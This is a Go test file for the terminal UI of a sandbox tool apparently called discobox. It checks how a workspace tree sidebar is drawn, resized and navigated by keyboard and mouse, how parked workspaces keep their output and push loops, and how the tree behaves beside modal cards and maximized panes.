package tui

import (
	"errors"
	"slices"
	"strings"
	"testing"

	tea "charm.land/bubbletea/v2"
	"github.com/charmbracelet/x/ansi"

	"github.com/discobox-ai/discobox/termpane"
)

// The workspace tree (tree.go) is drawn left of the window on a console wide
// enough for it, which is every console the driver opens at its default 120
// columns. The window right of it measures in its own coordinates — paneOrigin,
// the tab and button spans, m.width — so the helpers here read the frame and
// aim the mouse in those coordinates rather than every test repeating the
// tree's offset.

// narrowConsole is a console too narrow for the tree: the window is the whole
// screen, as it was before the tree, and detaching leaves the workspace for
// the list.
const narrowConsole = treeMinScreen - 10

// wideConsole is a console whose window beside the tree is as wide as the
// driver's default console: for the tests about what a page or a tab in the
// window says, which read the same as they did with the window to itself.
const wideConsole = 120 + treeWidth

// windowLines is the rendered frame with the tree's columns cut off the left,
// escapes intact: the window as it measures itself. With no tree drawn it is
// the whole frame.
func windowLines(m *Model) []string {
	lines := strings.Split(rawFrame(m), "\n")
	cut := m.treeCost()
	for i, line := range lines {
		lines[i] = ansi.TruncateLeft(line, cut, "")
	}
	return lines
}

// rawWindow is windowLines as one string.
func rawWindow(m *Model) string { return strings.Join(windowLines(m), "\n") }

// plainWindow is the window right of the tree as text, every escape removed.
func plainWindow(m *Model) string { return ansi.Strip(rawWindow(m)) }

// windowText is plainWindow with each line's trailing blanks trimmed, as
// frameText is of the whole frame.
func windowText(m *Model) string {
	lines := strings.Split(plainWindow(m), "\n")
	for i, line := range lines {
		lines[i] = strings.TrimRight(line, " ")
	}
	return strings.Join(lines, "\n")
}

// toScreen moves a mouse event aimed in the window's coordinates to the
// screen's: right by the tree, when it is drawn.
func toScreen(m *Model, msg tea.Msg) tea.Msg {
	dx := m.treeCost()
	switch ev := msg.(type) {
	case tea.MouseClickMsg:
		ev.X += dx
		return ev
	case tea.MouseReleaseMsg:
		ev.X += dx
		return ev
	case tea.MouseMotionMsg:
		ev.X += dx
		return ev
	case tea.MouseWheelMsg:
		ev.X += dx
		return ev
	}
	return msg
}

// windowMouse dispatches a mouse event aimed in the window's coordinates.
func (d *driver) windowMouse(msg tea.Msg) {
	d.t.Helper()
	d.dispatch(toScreen(d.m, msg))
}

// clickWindow presses and releases the left button on one cell of the window,
// in its own coordinates.
func clickWindow(d *driver, x, y int) {
	d.windowMouse(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft})
	d.windowMouse(tea.MouseReleaseMsg{X: x, Y: y, Button: tea.MouseLeft})
}

// screenOrigin is where a pane's grid starts on the screen: paneOrigin, right
// of the tree.
func screenOrigin(m *Model, p *pane) (x, y int) {
	x, y = m.paneOrigin(p)
	return x + m.treeCost(), y
}

// openNarrowWorkspace is openWorkspace on a console too narrow for the tree,
// where the workspace is the whole window and detach leaves it for the list.
func openNarrowWorkspace(t *testing.T, ds *fakeSource, act string) (*driver, *Model, *fakeTerminal) {
	t.Helper()
	return openWorkspaceAt(t, ds, act, narrowConsole)
}

// treeRow is the tree's columns of the first frame line carrying text in them,
// as plain text.
func treeRow(t *testing.T, m *Model, text string) string {
	t.Helper()
	for _, line := range strings.Split(plainFrame(m), "\n") {
		row := ansi.Truncate(line, treeWidth, "")
		if strings.Contains(row, text) {
			return row
		}
	}
	t.Fatalf("%q is not in the tree:\n%s", text, plainFrame(m))
	return ""
}

// treeKeyOf is the key a tree entry's row names at its right end, or "" for
// a row that names none.
func treeKeyOf(t *testing.T, m *Model, label string) string {
	t.Helper()
	row := strings.TrimRight(treeRow(t, m, label), " │")
	rest := strings.TrimSpace(row[strings.Index(row, label)+len(label):])
	return rest
}

// primaryOpens counts the attaches to one discobox's primary terminal.
func primaryOpens(ds *fakeSource, id string) int {
	n := 0
	for _, open := range ds.execOpened() {
		if strings.HasPrefix(open, id+" "+ExecPrimary+" ") {
			n++
		}
	}
	return n
}

// leader presses the leader and then a key, as two key presses.
func (d *driver) leader(key string) {
	d.t.Helper()
	d.key(d.m.leader())
	d.key(key)
}

// On a console wide enough, the tree of discoboxes is drawn left of an open
// workspace and the window gives it its cells; on a narrow one the workspace
// has the whole screen, as it had before the tree.
func TestTheTreeIsDrawnBesideAWorkspaceOnAWideConsole(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	_, m, _ := openWorkspace(t, ds, "enter")

	if !m.treeShown() {
		t.Fatal("the tree should be drawn beside the workspace")
	}
	if m.screenWidth != 120 || m.width != 120-treeWidth {
		t.Fatalf("screen %d, window %d; want the window %d cells less than the screen", m.screenWidth, m.width, treeWidth)
	}
	lines := strings.Split(plainFrame(m), "\n")
	if !strings.HasPrefix(strings.TrimSpace(lines[0]), "discobox") {
		t.Fatalf("the tree's top row should be the brand: %q", lines[0])
	}
	if top := ansi.Truncate(lines[1], treeWidth, ""); !strings.HasPrefix(top, "╭") || !strings.Contains(top, "discoboxes") || !strings.HasSuffix(top, "╮") {
		t.Fatalf("the tree's box should start a row down, titled: %q", top)
	}
	for _, name := range []string{"fix flaky pool rea", "exec/terminal cons"} {
		treeRow(t, m, name)
	}
	// The window right of it is the workspace, drawn at its own width.
	if box := windowLines(m)[1]; !strings.HasPrefix(ansi.Strip(box), "╭") {
		t.Fatalf("the workspace's box should start right of the tree: %q", ansi.Strip(box))
	}
	for i, line := range windowLines(m) {
		if w := ansi.StringWidth(line); w != m.width {
			t.Fatalf("window line %d is %d cells, want %d", i, w, m.width)
		}
	}
}

func TestTheTreeIsNotDrawnOnANarrowConsole(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	_, m, _ := openNarrowWorkspace(t, ds, "enter")

	if m.treeShown() {
		t.Fatal("a narrow console has no room for the tree")
	}
	if m.width != narrowConsole || m.screenWidth != narrowConsole {
		t.Fatalf("screen %d, window %d; want the workspace the whole %d", m.screenWidth, m.width, narrowConsole)
	}
	if frame := plainFrame(m); strings.Contains(frame, "discoboxes") {
		t.Fatalf("the tree should not be drawn:\n%s", frame)
	}
}

// Widening a narrow console puts the tree beside the workspace, and narrowing
// it takes the tree away again, the panes resized each time.
func TestResizingAcrossTheThresholdShowsAndHidesTheTree(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openNarrowWorkspace(t, ds, "enter")

	d.dispatch(sizeMsg(treeMinScreen, 40))
	if !m.treeShown() || m.width != treeMinScreen-treeWidth {
		t.Fatalf("at %d columns: tree %v, window %d; want the tree and the rest", treeMinScreen, m.treeShown(), m.width)
	}
	cols, rows := m.paneCells(m.paneWidthOf(m.primary()))
	d.wait("the primary resized beside the tree", func() bool { return term.size() == [2]int{cols, rows} })

	d.dispatch(sizeMsg(treeMinScreen-1, 40))
	if m.treeShown() || m.width != treeMinScreen-1 {
		t.Fatalf("at %d columns: tree %v, window %d; want no tree", treeMinScreen-1, m.treeShown(), m.width)
	}
}

// The leader's ↓ switches to the discobox below in the tree, parking the one
// on screen still attached; ↑ brings it back as it was left, without
// attaching to it again.
func TestTheLeaderSwitchesBoxesAndParksTheOneLeft(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openWorkspace(t, ds, "enter")
	first := m.primary()
	if got := primaryOpens(ds, "sbx_one"); got != 1 {
		t.Fatalf("sbx_one's primary attached %d times, want once", got)
	}

	d.leader("down")
	d.wait("the second box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
	if m.parked["sbx_one"] == nil {
		t.Fatal("the box switched away from should be parked")
	}
	select {
	case <-term.closed:
		t.Fatal("parking closed the first box's stream")
	default:
	}
	if got := primaryOpens(ds, "sbx_two"); got != 1 {
		t.Fatalf("sbx_two's primary attached %d times, want once", got)
	}
	if !m.treeShown() || m.focus != focusPane {
		t.Fatalf("tree %v, focus %v; want the new box's panes beside the tree", m.treeShown(), m.focus)
	}
	if got := m.list.current(); got == nil || got.ID != "sbx_two" {
		t.Fatalf("the tree's cursor is on %v, want the box on screen", got)
	}

	// k is ↑ too, and it is the parked workspace that comes back.
	d.leader("k")
	d.wait("the first box", func() bool { return m.paneBox.ID == "sbx_one" && m.primary() != nil })
	if m.primary() != first {
		t.Fatal("switching back should bring the parked primary back, not a new one")
	}
	if m.parked["sbx_one"] != nil || m.parked["sbx_two"] == nil {
		t.Fatalf("parked = %v, want sbx_two parked and sbx_one live", m.parked)
	}
	d.settle()
	if got := primaryOpens(ds, "sbx_one"); got != 1 {
		t.Fatalf("sbx_one's primary attached %d times, want switching back to attach nothing", got)
	}
	// The ends stop rather than wrap.
	d.leader("up")
	if m.paneBox.ID != "sbx_one" {
		t.Fatalf("↑ off the top switched to %s", m.paneBox.ID)
	}
}

// The leader's walk does not start a stopped box it passes: it stops on the
// row with only the tree's cursor, the workspace still on screen, and Enter
// is what attaches — and so starts — it. ↑ from there goes back to the panes.
func TestTheLeaderStopsOnAStoppedBoxUntilEnter(t *testing.T) {
	t.Parallel()
	boxes := testSandboxes()
	boxes[1].State = StateStopped
	ds := newFakeSource(boxes...)
	d, m, _ := openWorkspace(t, ds, "enter")

	d.leader("down")
	d.settle()
	if m.paneBox.ID != "sbx_one" || m.primary() == nil || len(m.parked) != 0 {
		t.Fatalf("box %s, parked %d; want sbx_one left on screen", m.paneBox.ID, len(m.parked))
	}
	if got := m.list.current(); !m.listFront || got == nil || got.ID != "sbx_two" {
		t.Fatalf("list front %v, cursor %v; want the tree's cursor on the stopped box", m.listFront, got)
	}
	if got := primaryOpens(ds, "sbx_two"); got != 0 {
		t.Fatalf("sbx_two's primary attached %d times, want the walk to start nothing", got)
	}
	if !strings.Contains(m.status, "enter starts it") {
		t.Fatalf("status = %q, want it to say Enter starts the box", m.status)
	}

	d.leader("up")
	d.settle()
	if m.listFront || m.focus != focusPane || m.paneBox.ID != "sbx_one" {
		t.Fatalf("list front %v, focus %v, box %s; want back in sbx_one's panes", m.listFront, m.focus, m.paneBox.ID)
	}

	d.leader("down")
	d.key("enter")
	d.wait("the stopped box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
	if got := primaryOpens(ds, "sbx_two"); got != 1 {
		t.Fatalf("sbx_two's primary attached %d times, want once on Enter", got)
	}
}

// Ctrl-Shift-J and K walk the tree with no leader, from a pane and from the
// list a stopped box left the keys on, and never reach the program. Ctrl-J,
// what a classic terminal sends instead, is still the program's.
func TestCtrlShiftWalksTheTreeWithoutTheLeader(t *testing.T) {
	t.Parallel()
	boxes := testSandboxes()
	boxes[1].State = StateStopped
	boxes[2].State, boxes[2].OriginKey, boxes[2].SourceOriginKey = StateRunning, boxes[0].OriginKey, boxes[0].SourceOriginKey
	ds := newFakeSource(boxes...)
	d, m, term := openWorkspace(t, ds, "enter")
	down := tea.KeyPressMsg{Code: 'j', Mod: tea.ModCtrl | tea.ModShift}
	up := tea.KeyPressMsg{Code: 'k', Mod: tea.ModCtrl | tea.ModShift}

	d.dispatch(down)
	d.settle()
	if got := m.list.current(); m.paneBox.ID != "sbx_one" || !m.listFront || got == nil || got.ID != "sbx_two" {
		t.Fatalf("box %s, list front %v, cursor %v; want the walk stopped on the stopped sbx_two", m.paneBox.ID, m.listFront, got)
	}
	d.dispatch(down)
	d.wait("the box past it", func() bool { return m.paneBox.ID == "sbx_three" && m.primary() != nil })
	if got := primaryOpens(ds, "sbx_two"); got != 0 {
		t.Fatalf("sbx_two's primary attached %d times, want the walk to start nothing", got)
	}
	d.dispatch(up)
	d.settle()
	d.dispatch(up)
	d.wait("the first box", func() bool { return m.paneBox.ID == "sbx_one" && m.focus == focusPane })
	if got := term.inputSoFar(); strings.ContainsAny(got, "jkJK\n") {
		t.Fatalf("the program received %q; the chords are the window's", got)
	}

	d.dispatch(tea.KeyPressMsg{Code: 'j', Mod: tea.ModCtrl})
	d.wait("ctrl+j at the program", func() bool { return strings.Contains(term.inputSoFar(), "\n") })
	if m.paneBox.ID != "sbx_one" {
		t.Fatalf("ctrl+j switched to %s; it is the program's", m.paneBox.ID)
	}
}

// A walk stops on any box that is not live, an errored one included: its
// state does not say whether its container is on, and attaching to one that
// is off starts it.
func TestTheLeaderStopsOnAnErroredBox(t *testing.T) {
	t.Parallel()
	boxes := testSandboxes()
	boxes[1].State = StateError
	ds := newFakeSource(boxes...)
	d, m, _ := openWorkspace(t, ds, "enter")

	d.leader("down")
	d.settle()
	if got := m.list.current(); m.paneBox.ID != "sbx_one" || !m.listFront || got == nil || got.ID != "sbx_two" {
		t.Fatalf("box %s, list front %v, cursor %v; want the walk stopped on the errored sbx_two", m.paneBox.ID, m.listFront, got)
	}
	if got := primaryOpens(ds, "sbx_two"); got != 0 {
		t.Fatalf("sbx_two's primary attached %d times, want the walk to attach nothing", got)
	}
}

// A run of the leader's Ctrl-↓ that stops on a stopped box leaves no leader
// armed in the pane behind it: back in the panes, Ctrl-J is the program's,
// not another walk.
func TestAWalkStoppedOnARowLeavesNoLeaderArmed(t *testing.T) {
	t.Parallel()
	boxes := testSandboxes()
	boxes[1].State = StateStopped
	ds := newFakeSource(boxes...)
	d, m, term := openWorkspace(t, ds, "enter")

	d.leader("ctrl+down")
	d.settle()
	if !m.listFront {
		t.Fatal("the walk should have stopped on the stopped box, with the list in front")
	}
	d.key("esc")
	if m.listFront || m.focus != focusPane {
		t.Fatalf("list front %v, focus %v; want the panes back", m.listFront, m.focus)
	}
	d.key("ctrl+j")
	d.wait("ctrl+j at the program", func() bool { return strings.Contains(term.inputSoFar(), "\n") })
	if m.listFront || m.paneBox.ID != "sbx_one" {
		t.Fatalf("list front %v, box %s; ctrl+j walked again", m.listFront, m.paneBox.ID)
	}
}

// A window with no tree to walk takes nothing: the leaderless chords go on to
// the program, as they would with nothing bound.
func TestTheChordReachesTheProgramWithNoTree(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m := openAttached(t, ds, testSandboxes()[0])
	d.wait("the primary terminal", func() bool { return m.primary() != nil && m.dialog == nil })
	term := ds.execTerm(ExecPrimary)
	before := term.inputSoFar()
	d.dispatch(tea.KeyPressMsg{Code: 'j', Mod: tea.ModCtrl | tea.ModShift})
	d.wait("the chord at the program", func() bool { return len(term.inputSoFar()) > len(before) })
	if m.paneBox.ID != "sbx_one" || len(m.parked) != 0 {
		t.Fatalf("box %s, parked %d; want nothing switched", m.paneBox.ID, len(m.parked))
	}
}

// The new discobox card is modal and its composer takes the keys: the chord
// does not walk out of it.
func TestTheChordDoesNotWalkOutOfTheNewCard(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")
	d.leader("h")
	d.key("n")
	if !m.newOpen || m.focus != focusPrompt {
		t.Fatalf("new open %v, focus %v; want the new card's composer", m.newOpen, m.focus)
	}
	d.dispatch(tea.KeyPressMsg{Code: 'j', Mod: tea.ModCtrl | tea.ModShift})
	d.settle()
	if !m.newOpen || m.focus != focusPrompt || m.paneBox.ID != "sbx_one" || len(m.parked) != 0 {
		t.Fatalf("new open %v, focus %v, box %s; want the card left as it was", m.newOpen, m.focus, m.paneBox.ID)
	}
}

// A single click on a stopped box's row in the tree is a step onto it: the
// cursor goes there and nothing is attached, so nothing starts. The second
// press of a double click is Enter, and attaches — starting it.
func TestAClickOnAStoppedRowPointsAndADoubleClickStartsIt(t *testing.T) {
	t.Parallel()
	boxes := testSandboxes()
	boxes[1].State = StateStopped
	ds := newFakeSource(boxes...)
	d, m, _ := openWorkspace(t, ds, "enter")

	x, y := at(t, m, "exec/terminal cons")
	d.dispatch(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft})
	d.settle()
	if got := m.list.current(); m.paneBox.ID != "sbx_one" || !m.listFront || got == nil || got.ID != "sbx_two" {
		t.Fatalf("box %s, list front %v, cursor %v; want the click to point at the stopped sbx_two", m.paneBox.ID, m.listFront, got)
	}
	if got := primaryOpens(ds, "sbx_two"); got != 0 {
		t.Fatalf("sbx_two's primary attached %d times, want a single click to start nothing", got)
	}

	d.dispatch(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft})
	d.wait("the stopped box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
	if m.listFront || m.focus != focusPane {
		t.Fatalf("list front %v, focus %v; want the started box's panes to have the keys", m.listFront, m.focus)
	}
}

// A double click on a live box's row switches to it on the first press, and
// the second, landing on the box now opening, leaves it the keys rather than
// taking them for the list — the window is not left with the list in front
// of a workspace nobody can type at.
func TestADoubleClickOnALiveRowLeavesItsPanesTheKeys(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")

	x, y := at(t, m, "exec/terminal cons")
	d.dispatch(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft})
	d.dispatch(tea.MouseClickMsg{X: x, Y: y, Button: tea.MouseLeft})
	d.wait("the second box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
	d.settle()
	if m.listFront || m.focus != focusPane {
		t.Fatalf("list front %v, focus %v; want sbx_two's panes to have the keys", m.listFront, m.focus)
	}
	if got := primaryOpens(ds, "sbx_two"); got != 1 {
		t.Fatalf("sbx_two's primary attached %d times, want once", got)
	}
}

// A parked workspace keeps emulating: what its terminal says while another
// box is on screen is there when it comes back.
func TestAParkedWorkspaceKeepsItsOutput(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openWorkspace(t, ds, "enter")
	first := m.primary()

	d.leader("j")
	d.wait("the second box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
	term.send("said while parked")
	d.wait("the parked pane to take it", func() bool {
		return strings.Contains(strings.Join(first.term.View(), "\n"), "said while parked")
	})
	if strings.Contains(plainFrame(m), "said while parked") {
		t.Fatal("a parked workspace is not drawn")
	}

	d.leader("k")
	d.wait("the first box", func() bool { return m.paneBox.ID == "sbx_one" })
	if !strings.Contains(plainFrame(m), "said while parked") {
		t.Fatalf("the output should be there on the way back:\n%s", plainFrame(m))
	}
}

// A parked workspace is still attached, so it goes on pushing: its loop runs
// on under the generation it was opened with, and says which box it pushed,
// since the one on screen is another. Back on screen it is the same loop, not
// a second one racing it; once the parked workspace has ended, a tick from
// that generation does nothing.
func TestAParkedWorkspaceKeepsPushing(t *testing.T) {
	t.Parallel()
	park := func(t *testing.T) (*driver, *Model, *fakeSource, *fakeTerminal, int) {
		t.Helper()
		ds := newFakeSource(pushableSandboxes()...)
		ds.pushes = []SourcePush{{Slug: "primary", Branch: "main", Commit: "b7d0f1145aa2", Pushed: true}}
		d, m, term := openWorkspace(t, ds, "enter")
		d.wait("the first look", func() bool { return len(ds.pushedCalls()) > 0 })
		gen := m.pushGen

		d.leader("down")
		d.wait("the second box", func() bool { return m.paneBox.ID == "sbx_two" && m.primary() != nil })
		ws := m.parked["sbx_one"]
		if ws == nil || ws.pushGen != gen {
			t.Fatalf("parked = %v, want sbx_one parked under generation %d", ws, gen)
		}
		return d, m, ds, term, gen
	}

	t.Run("parked", func(t *testing.T) {
		t.Parallel()
		d, m, ds, _, gen := park(t)
		d.settle()
		before := len(ds.pushedCalls())
		m.status = ""

		d.dispatch(autoPushTickMsg{box: "sbx_one", gen: gen})
		d.wait("the parked box's look", func() bool { return len(ds.pushedCalls()) > before })
		if got := ds.pushedCalls()[before]; got != "sbx_one" {
			t.Fatalf("pushed %q, want the parked box", got)
		}
		d.wait("the report", func() bool { return strings.Contains(m.status, "pushed b7d0f1145aa2") })
		if !strings.HasPrefix(m.status, "fix flaky pool reaper tests: ") {
			t.Fatalf("status = %q, want it to name the parked box it is about", m.status)
		}
	})

	t.Run("unparked", func(t *testing.T) {
		t.Parallel()
		d, m, ds, _, gen := park(t)
		d.settle()
		before := len(ds.pushedCalls())
		d.leader("up")
		d.wait("the first box", func() bool { return m.paneBox.ID == "sbx_one" && m.parked["sbx_one"] == nil })
		d.settle()
		// Back on screen it is the loop it already had: showing it starts no
		// second push over one that may still be running.
		if after := len(ds.pushedCalls()); after != before {
			t.Fatalf("looks = %d, want none started by showing the box again (%d)", after, before)
		}
		if m.pushGen != gen {
			t.Fatalf("pushGen = %d, want the loop it was opened with (%d)", m.pushGen, gen)
		}
		d.dispatch(autoPushTickMsg{box: "sbx_one", gen: gen})
		d.wait("the same loop's next look", func() bool { return len(ds.pushedCalls()) > before })
		if got := ds.pushedCalls()[before]; got != "sbx_one" {
			t.Fatalf("pushed %q, want the box on screen", got)
		}
	})

	t.Run("closed", func(t *testing.T) {
		t.Parallel()
		d, m, ds, term, gen := park(t)
		term.Close()
		d.wait("the parked workspace to go", func() bool { return m.parked["sbx_one"] == nil })
		d.settle()
		before := len(ds.pushedCalls())

		d.dispatch(autoPushTickMsg{box: "sbx_one", gen: gen})
		d.settle()
		if after := len(ds.pushedCalls()); after != before {
			t.Fatalf("looks = %d, want the loop to have ended with the parked workspace (%d)", after, before)
		}
		if m.paneBox.ID != "sbx_two" || m.primary() == nil {
			t.Fatal("the box on screen should be left as it was")
		}
	})
}

// The leader's h from the leftmost pane gives the keys to the list in the
// tree; Esc gives them back. While the list has them, its border is the
// focused one and the panes' is not.
func TestTheLeaderHFocusesTheList(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openWorkspace(t, ds, "enter")
	m.st = newStyles(true)

	// A box's color is the one its top-left corner is drawn in.
	corner := func(line string, style func(...string) string) bool {
		want := style("╭")
		want = want[:strings.Index(want, "╭")]
		i := strings.Index(line, "╭")
		return i >= 0 && strings.HasSuffix(line[:i], want)
	}
	treeTop := func() string { return strings.Split(rawFrame(m), "\n")[1] }
	paneTop := func() string { return windowLines(m)[1] }
	if !corner(paneTop(), m.st.frame.Render) || !corner(treeTop(), m.st.rule.Render) {
		t.Fatalf("with the panes focused their edge should be the bright one:\ntree %q\npane %q", treeTop(), paneTop())
	}

	d.leader("h")
	if !m.listFront || m.focus != focusList {
		t.Fatalf("listFront %v, focus %v; want the list to have the keys", m.listFront, m.focus)
	}
	if got := m.list.current(); got == nil || got.ID != "sbx_one" {
		t.Fatalf("the list's cursor is on %v, want the box on screen", got)
	}
	if !corner(treeTop(), m.st.frame.Render) || !corner(paneTop(), m.st.rule.Render) {
		t.Fatalf("with the list focused its edge should be the bright one:\ntree %q\npane %q", treeTop(), paneTop())
	}
	// A key on the list is the list's, not the box's.
	before := term.typed("")
	d.key("x")
	if got := term.typed(""); got != before {
		t.Fatalf("typed %q, want a key on the list kept from the box", got)
	}

	d.key("esc")
	if m.listFront || m.focus != focusPane || !m.inPanes() {
		t.Fatalf("listFront %v, focus %v; want the panes back", m.listFront, m.focus)
	}
	if !corner(paneTop(), m.st.frame.Render) {
		t.Fatalf("the panes' edge should be bright again: %q", paneTop())
	}
}

// The tree's entries under the list name their keys only where those keys
// work: every one with the list's keys, the function keys from a page too, and
// none while the panes have the keys. F3 from the list draws the harnesses
// page right of the tree.
func TestThePagesOpenRightOfTheTreeAndNameTheirKeysWhereTheyWork(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")

	for _, label := range []string{"+ new discobox", "harnesses", "secrets", "skills"} {
		if key := treeKeyOf(t, m, label); key != "" {
			t.Fatalf("with the panes focused %q names %q, want no key", label, key)
		}
	}

	d.leader("h")
	for label, want := range map[string]string{"+ new discobox": "n", "harnesses": "F3", "secrets": "F4", "skills": "F5"} {
		if key := treeKeyOf(t, m, label); key != want {
			t.Fatalf("with the list focused %q names %q, want %q", label, key, want)
		}
	}

	d.key(harnessesKey)
	d.wait("the harnesses", func() bool { return m.harnessesOpen })
	if !m.treeShown() || m.listFront {
		t.Fatalf("tree %v, listFront %v; want the page beside the tree with the keys", m.treeShown(), m.listFront)
	}
	window := plainWindow(m)
	if !strings.Contains(window, "Harnesses") || !strings.Contains(window, "Claude") {
		t.Fatalf("the harnesses should be drawn right of the tree:\n%s", window)
	}
	if strings.Contains(window, "discoboxes") {
		t.Fatalf("the tree should not be drawn in the window:\n%s", window)
	}
	if strings.Contains(window, "sbx_one  main@") {
		t.Fatalf("the page has no workspace header over it:\n%s", window)
	}
	for label, want := range map[string]string{"+ new discobox": "", "harnesses": "F3", "secrets": "F4", "skills": "F5"} {
		if key := treeKeyOf(t, m, label); key != want {
			t.Fatalf("with a page up %q names %q, want %q", label, key, want)
		}
	}

	// The workspace under the page is still there, and Esc puts the page
	// away onto it.
	if m.primary() == nil {
		t.Fatal("the page should leave the workspace attached under it")
	}
	d.key("esc")
	if m.harnessesOpen || !m.inPanes() || m.focus != focusPane || m.primary() == nil {
		t.Fatalf("harnesses %v, inPanes %v, focus %v; want the workspace back after the page", m.harnessesOpen, m.inPanes(), m.focus)
	}
}

// n on the list opens the new discobox card. It is modal: the tree is greyed
// and takes no clicks while it is up, and Esc puts it away.
func TestNewDiscoboxIsAModalCardBesideTheTree(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")

	d.leader("h")
	d.key("n")
	if !m.newOpen || m.focus != focusPrompt {
		t.Fatalf("newOpen %v, focus %v; want the card with the composer", m.newOpen, m.focus)
	}
	if !m.treeBlocked() {
		t.Fatal("the tree should be blocked while the card is up")
	}
	if window := plainWindow(m); !strings.Contains(window, "New discobox") || !strings.Contains(window, "Enter creates") {
		t.Fatalf("the card should be drawn right of the tree:\n%s", window)
	}
	if !m.treeShown() {
		t.Fatal("the tree stays drawn beside the card")
	}
	// Greyed: drawn in the one muted color, nothing of its own.
	m.st = newStyles(true)
	grey := m.st.greyedOut.Render("x")
	greyOn := grey[:strings.Index(grey, "x")]
	for i, line := range strings.Split(rawFrame(m), "\n") {
		tree := ansi.Truncate(line, treeWidth, "")
		if strings.TrimSpace(ansi.Strip(tree)) != "" && !strings.HasPrefix(tree, greyOn) {
			t.Fatalf("tree row %d is not greyed: %q", i, tree)
		}
	}

	// A click on another box in the tree goes nowhere.
	x, y := at(t, m, "exec/terminal co")
	tap(t, m, x, y)
	if m.paneBox.ID != "sbx_one" || !m.newOpen {
		t.Fatalf("box %s, card %v; want the click on the blocked tree to do nothing", m.paneBox.ID, m.newOpen)
	}

	d.key("esc")
	if m.newOpen || m.treeBlocked() {
		t.Fatalf("newOpen %v, blocked %v; want Esc to put the card away", m.newOpen, m.treeBlocked())
	}
	if !m.inPanes() || m.focus != focusPane {
		t.Fatalf("inPanes %v, focus %v; want the workspace back", m.inPanes(), m.focus)
	}
}

// A maximized column takes the tree's cells too, and gives them back.
func TestMaximizingAColumnHidesTheTree(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, _ := openWorkspace(t, ds, "enter")
	d.leader("s")
	d.wait("the shell", func() bool { return m.shells.len() == 1 && m.onShells })

	d.leader(paneZoomKey)
	if !m.maximized {
		t.Fatal("the leader's z should maximize the column")
	}
	if m.treeShown() || m.width != m.screenWidth {
		t.Fatalf("tree %v, window %d of %d; want the column to have the whole screen", m.treeShown(), m.width, m.screenWidth)
	}
	if strings.Contains(plainFrame(m), "discoboxes") {
		t.Fatalf("the tree should not be drawn beside a maximized column:\n%s", plainFrame(m))
	}
	if got := m.paneWidthOf(m.shells.panes[0]); got != m.screenWidth {
		t.Fatalf("the shell is %d cells, want the screen's %d", got, m.screenWidth)
	}

	d.leader(paneZoomKey)
	if m.maximized || !m.treeShown() || m.width != m.screenWidth-treeWidth {
		t.Fatalf("maximized %v, tree %v, window %d; want the split back beside the tree", m.maximized, m.treeShown(), m.width)
	}
}

// Beside the tree there is no list to detach to: the leader's d does nothing
// in the panes, and nothing offers it. A narrow console, with no tree, still
// detaches.
func TestTheLeaderDDoesNothingBesideTheTree(t *testing.T) {
	t.Parallel()
	ds := newFakeSource(testSandboxes()...)
	d, m, term := openWorkspace(t, ds, "enter")
	d.leader("s")
	d.wait("the shell", func() bool { return m.shells.len() == 1 })

	for _, onShells := range []bool{true, false} {
		if onShells != m.onShells {
			d.leader("h")
		}
		d.leader(paneDetachAlt)
		d.settle()
		if !m.inPanes() || m.primary() == nil || m.shells.len() != 1 || m.focus != focusPane {
			t.Fatalf("onShells=%v: inPanes %v, shells %d, focus %v; want the leader's d to leave the workspace alone",
				onShells, m.inPanes(), m.shells.len(), m.focus)
		}
	}
	select {
	case <-term.closed:
		t.Fatal("the primary's stream was closed")
	default:
	}
	for name, hints := range map[string][]hint{"keys": m.hints(), "header": m.headerHints()} {
		if got := hintLine(hints); strings.Contains(got, "detach") {
			t.Fatalf("the %s offer detach: %q", name, got)
		}
	}
	if strings.Contains(plainFrame(m), "detach") {
		t.Fatalf("the frame offers detach:\n%s", plainFrame(m))
	}
	detachLine := "    " + m.detachHint() + "       "
	if strings.Contains(m.helpText(), detachLine) {
		t.Fatal("the help offers detach beside the tree")
	}

	ds2 := newFakeSource(testSandboxes()...)
	d2, m2, _ := openNarrowWorkspace(t, ds2, "enter")
	if got := hintLine(m2.headerHints()); !strings.Contains(got, m2.detachHint()+" detach") {
		t.Fatalf("a narrow console's header should offer detach: %q", got)
	}
	if !strings.Contains(m2.helpText(), detachLine) {
		t.Fatal("a narrow console's help should offer detach")
	}
	d2.leader(paneDetachAlt)
	d2.wait("the workspace to close", func() bool { return !m2.inPanes() })
	if m2.focus != focusList {
		t.Fatalf("focus = %v, want the list a narrow console detaches to", m2.focus)
	}
}

// boxMenuLabels is the labels of the actions menu on screen, in order.
func boxMenuLabels(t *testing.T, m *Model) []string {
	t.Helper()
	if m.dialog == nil || m.dialog.kind != dlgActions {
		t.Fatalf("dialog = %v, want the box's actions menu", m.dialog)
	}
	var labels []string
	for _, it := range m.dialog.items {
		labels = append(labels, it.label)
	}
	return labels
}

// The leader's . opens the box's actions: everything the list's menu offers
// for it but attach, which it already is, with the workspace's own tools and
// audit after shell.
